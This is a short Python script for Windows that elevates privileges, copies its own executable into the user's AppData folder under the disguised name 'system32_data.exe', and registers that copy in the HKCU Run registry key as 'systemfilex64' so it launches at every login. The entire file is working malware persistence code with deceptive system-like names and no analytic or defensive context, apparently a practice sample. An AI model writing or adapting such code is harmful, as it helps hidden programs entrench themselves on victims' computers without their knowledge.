import os
import shutil
import winreg
import sys
import time
from elevate import elevate

elevate()
print("elevated")

curr_executable = sys.executable
print(curr_executable)
time.sleep(5)
app_data = os.getenv("APPDATA")
to_save_file = app_data +"\\"+"system32_data.exe"

time.sleep(5)
print(to_save_file)

if not os.path.exists(to_save_file):
    print("Becoming Persistent")
    shutil.copyfile(curr_executable, to_save_file)

    key = winreg.HKEY_CURRENT_USER

    # "Software\Microsoft\Windows\CurrentVersion\Run"

    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

    key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)

    winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, to_save_file)

    winreg.CloseKey(key_obj)
else:
    print("path doesnt exist")

time.sleep(100)